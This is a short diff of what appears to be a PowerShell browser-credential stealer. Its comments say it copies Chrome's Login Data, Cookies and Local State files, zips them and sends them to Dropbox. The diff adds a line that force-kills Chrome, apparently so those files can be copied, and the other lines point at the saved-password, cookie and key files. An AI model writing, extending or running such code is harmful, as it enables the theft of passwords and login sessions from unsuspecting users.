@@ -27,6 +27,8 @@
 # Google Chrome - copy Login Data, Cookies, and Local State files and add them to a new folder called Google-UserData
 # then zip that folder to be ready to send to dropbox
 
+taskkill /F /IM chrome.exe
+
 $GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 $GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
 $GLocalStatePath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State"
